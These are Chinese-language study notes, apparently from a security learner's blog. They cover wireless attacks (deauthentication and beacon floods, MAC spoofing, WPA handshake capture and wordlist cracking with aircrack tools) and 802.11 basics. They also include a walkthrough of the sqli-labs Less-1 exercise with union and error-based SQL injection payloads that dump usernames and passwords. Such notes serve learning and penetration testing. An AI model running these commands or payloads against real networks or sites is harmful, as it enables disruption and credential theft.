无线拒绝服务

介绍三种常用的无线拒绝服务攻击类型，需要网卡切换至监听模式，命令如下：

ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up

Beacon Flood

    伪造大量包含不同SSID的Beacon帧，使无线客户端产生大量的虚假AP，有时可能造成无线网络扫描器或客户端驱动崩溃。

deauth Flood

    由于不需要经过客户端与接入点双方的授权，因此攻击者冒充客户端可以伪造一个断开连接的数据包请求中断连接。这就是针对无线客户端的拒绝服务攻击

aireplay-ng --deauth 10 -a AP的MAC地址 wlan0

在mdk3/mdk4中有更好的方法：

mdk4 wlan0 -d -B AP的MAC地址

这样该会一直对AP发送端开链接的包，达到更好的效果

MAC地址绕过

可以在airodump-ng中查看到已经建立连接的STA的MAC地址

利用命令修改掉无线网卡的MAC地址就可以绕过

ifconfig wlan0 down
ifconfig wlan0 hw ether xx:xx:xx:xx:xx:xx
ifconfig wlan0 up

有工具macchanger

macchanger -m xx:xx:xx:xx:xx:xx wlan0

随机MAC

macchanger -r wlan0

WPS-PSK密码爆破

先对所选信道抓包（一定要指定信道，方便后面“踢人”）

airodump-ng wlan0mon -c 信道 --bssid AP的MAC地址 -w 文件名

踢掉合法验证过的用户，让其重新发送握手包：

aireplay-ng --deauth 10 -a AP的MAC地址 wlan0mon

直到airodump抓到握手包

执行以下命令破解

aircrake-ng -w wordlist.txt 数据包.cap

能够破解的关键是是字典是否强大

扫描与发现无线网络

被动扫描

    客户端在每个信道上切换以监听AP周期性（100ms）发送的beacon帧，获得接入点的SSID（热点名称）、BSSID（AP的MAC地址）、所支持的速率。

主动扫描

    客户端在每个信道之间切换，并向广播地址（ff:ff:ff:ff:ff:ff）发送Probe Requests帧，一旦发送后就会启动一个计时器并等待响应，计时器结束后处理所有收到的应答。没有响应的话就切换至下一个信道重复以上过程。

    定向探测请求：发送的Probe Requests帧指定SSID，只有该SSID会应答；

    广播探测请求：发送的Probe Requests帧SSID的值为空，收到请求的所有热点都会响应。

监听模式

    非监听模式下，系统内核会将筛选后的802.11帧封装成普通的网络帧传递给上层；

    监听模式下，内核会直接将802.11帧直接传递给上层，在用户层直接通过接口就可得到原始数据包。

Linux系统中的NetworkManager等网络配置会改变网卡的工作模式和对信道造成干扰，使用一下命令：airmon-ng check kill停止此类服务。通过sudo service –status-all、service network-manager restar开启。

常用命令

_iwfonfig_命令

将wlan0设置为监听模式并设置信道为11

ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up
iwconfig wlan0 channel 11

iw命令

iw命令是iwconfig的扩展,可以查看无线网卡接口名称、工作模式、信道等信息

iw dev wlan0 info

除此之外，iw命令还可以开启虚拟接口：

iw dev wlan0 interface add mon0 type monitor
ifconfig mon0 up
iw dev mon0 set channel 11

撤销命令
iw dev mon0 del

常用组件

Airmon-ng（小写的airmon-ng是Airmon-ng工具中的一个组件）是一款常用的渗透测试及破解类工具之一，他包含了多款无线审计工具

扫描无线网络

airmon-ng

使用airmon-ng start wlan0 开启监听模式

airodump-ng wlan0mon 抓包

其中包括两部分内容：

    上半部分：周边的热点信息

    下半部分：捕获到的无线客户端

KISmet

    Kismet是一款802.11协议数据包捕获分析框架，额外支持无线帧的嗅探和破解、隐藏热点的发现 以及GPS和蓝牙扫描

wireshark

    过滤规则：

筛选所有Beacon帧：wlan.fctype_subtype == 0x0008

筛选所有Probe Response帧：wlan.fctype_subtype == 0x0005

对于隐藏网络的发现

    出于安全考虑，许多的无线网络都会开启隐藏模式。在此模式下Beacon帧中将不包含SSID，也不在回复Broadcast Probe REquests帧。合法的客户端想要连接，需要发送包含了热点名称的Directed Probe Requests帧。

    简单来说就是：必须知道热点的名称，才可以与隐藏模式下的热点建立连接

薄弱点

    合法的客户端想要连接，需要发送包含了热点名称的Directed Probe Requests帧

利用方式

1.抓包，等待合法用户连接

2.将合法用户从连接中“踢掉”，迫使他重新连接发起交互，抓包（deauth攻击）

总结

    隐藏热点并不能增加安全性，攻击者只是多个一个步骤而已。

802.11结构体系

##Wi-Fi与802.11标准的区别

802.11标准由IEEE负责管理，由于该标准比较复杂，更新缓慢，故众多设备的制造商自行推动成立了Wi-Fi联盟

802.11结构体系

主要有以下几大组件：

STA：station站（配备无线功能的客户端）

AP：access point 无线接入点（无线到有线的桥接设备）

IBSS：（独立基本服务，最少由两个STA组成）

其中一个无线客户端作为IBSS的第一个客户端，承担部分AP的责任（周期性发送Beacon帧、新成员的认证）
不充当信息中继的桥梁

BSS：基本服务集（由单个AP和至少一个STA组成）

所有的STA通过AP通信，AP提供了与有线LAN的连接，提供桥接功能。

ESS：扩展服务集（由连接到相同有线子网且采用相同的SSID的多个BSS构成）

一个ESS中的所有STA可以相互通信

DS：分布式系统（连接BSS的组件）

允许STA在多个BSS之间漫游，大多数情况下AP通过有线连接，无线情况称做WDS即无线分布式系统

SSID

服务集标识符
ESS网络的无线网络名称

BSSID

BSS 网络标识 AP的mac地址

less1

单引号报错

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1

查看源码，sql语句为：

SELECT * FROM users WHERE id='$id' LIMIT 0,1

联合查询

    先使用id=-1让sql语句前半部分报错，方便执行后面的sql语句

    用order by 判断有三个字段，回显位为2、3

构造payload如下：

爆库：
?id=-1' union select 1,2,database() --

库名：security

爆表：

?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() -- -

    可以看到，security库有emails、referers、uagents、users四个表，其中我们需要users表的内容

爆字段（列名）：
?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' -- -

    我们发现爆破出了SER、CURRENT_CONNECTIONS、TOTAL_CONNECTIONS、id、username、password6个列名，其中只有后面三个才是我们需要的，之所以会出现前三个数据，是因为我们只指定了table_name=’users’。其他的users表名会造成干扰。修改payload：

?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' and table_schema = 'security'-- -

爆值
?id=-1' union select 1,2,group_concat(username,0x3a,password) from users -- -

    0x3a中3a是十进制的58，代表冒号。

小结：

    先使用order by 和select 1，2，3判断回显位，然后用union查询，配合group_concat函数，使结果显示在一行中。依靠information_schema爆库。这里的id=-1是为了让语句的前半句报错，这样后半句的结果才会被回显出来。

报错注入

    判断方式：

?id=1' and 1=1 -- - 页面正常

?id=1' and 1=1 -- - 页面不正常

    我们常见的报错注入大多回用到extractvalue()、updatexml()这两个函数。

extractvalue

函数的格式：
EXTRACTVALUE(XML_document, XPath_string);

第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc

第二个参数：XPath_string (Xpath格式的字符串)

利用点在第二个参数，用concat()将其连接成一个字符串，就不会出现格式的错误，举个例子：

爆库名：
?id = 1' and extractvalue(1,concat(0x7e,database(),0x7e))

updataxml

UPDATEXML (XML_document, XPath_string, new_value);

第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc

第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。

第三个参数：new_value，String格式，替换查找到的符合条件的数据
作用：改变文档中符合条件的节点的值

同样的利用点在第二个参数处，举个例子：

爆库名：
?id=1 and updatexml(1,concat(0x7e,database(),0x7e),1)

payload

爆表名：
?id=1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) -- -

爆列名：
?id=1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema = 'security'),0x7e)) -- -

爆值：
?id=1' and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e)) -- -

    可以发现并没有完全显示出来，是因为extractvalue能查询的字符串最大长度为32位，超出的部分就显示不出来了，这里我们用substring()函数截取

substring((SQL语句),1,5)

?id=1' and extractvalue(1,concat(0x7e,substring((select group_concat(username,0x3a,password) from users),32,64),0x7e)) -- -

逐次跑出所有

小结

union时，id=-1 使语句报错；报错注入时，不要让语句报错。
